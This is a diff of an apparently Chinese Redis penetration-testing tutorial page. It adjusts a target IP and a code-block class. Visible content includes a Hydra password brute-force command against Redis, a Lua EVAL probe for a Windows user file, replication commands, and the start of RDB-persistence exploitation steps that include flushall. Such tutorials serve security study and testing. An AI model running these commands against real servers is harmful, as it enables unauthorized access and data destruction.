@@ -528,7 +528,7 @@ set rohosts 192.168.11.133
 run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9abaff419efd5fc973b2dc0cff95f28.png"></p>
 <p><strong>Hydra</strong></p>
-<pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">hydra</span> -P redis_pass<span class="token operator">.</span>txt redis<span class="token punctuation">:</span></span><span class="token comment" spellcheck="true">//192.168.0.100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">hydra</span> -P redis_pass<span class="token operator">.</span>txt redis<span class="token punctuation">:</span></span><span class="token comment" spellcheck="true">//192.168.11.133</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/bd5f9c678d6039c2e3f460c025ca20a3.png"></p>
 <p><strong>超级弱口令工具</strong><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6de20cd9b8d9e90a395bc957b2b20b2a.png"></p>
 <h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>主要是利用一些命令获取信息，获取客户端连接信息： <code>CLIENT LIST</code><br> <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b84eb1177fba33809271c0dd872b5e99.png"><br> 探测文件是否存在(&gt;2.6.0)：<code>EVAL "return dofile('C:/Users/yanghao/NTUSER.DAT')" 0</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fe9fd97c62e0cc0443e241422100b2fc.png"></p>
@@ -581,7 +581,7 @@ SLAVEOF host port / REPLICAOF host port
 SLAVEOF ON ONE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="Ridis持久化-数据集备份-利用"><a href="#Ridis持久化-数据集备份-利用" class="headerlink" title="Ridis持久化(数据集备份)利用"></a>Ridis持久化(数据集备份)利用</h3><p><a target="_blank" rel="noopener" href="https://redis.io/topics/persistence">Redis持久化</a>是指可以将数据集保存到本地磁盘中的操作，有RDB和AOF两种方式。通过数据备份操作将数据写入到磁盘中进行利用，但是某些格式写入数据的会包含Redis备份的标记存在脏数据，这只能用于一些有容错性的文件利用。</p>
 <h4 id="RDB备份文件利用"><a href="#RDB备份文件利用" class="headerlink" title="RDB备份文件利用"></a>RDB备份文件利用</h4><p>基础的命令如下：</p>
-<pre class="line-numbers language-cmd"><code class="language-cmd">DBSIZE                   # 统计KEYS
+<pre class="line-numbers language-text"><code class="language-text">DBSIZE                   # 统计KEYS
 flushall                  # 如果键过多导致备份过大，全部清空KEYS(危险)
 CONFIG GET slave-read-only      # 查询只读配置
 CONFIG SET slave-read-only no    # 关闭只读配置
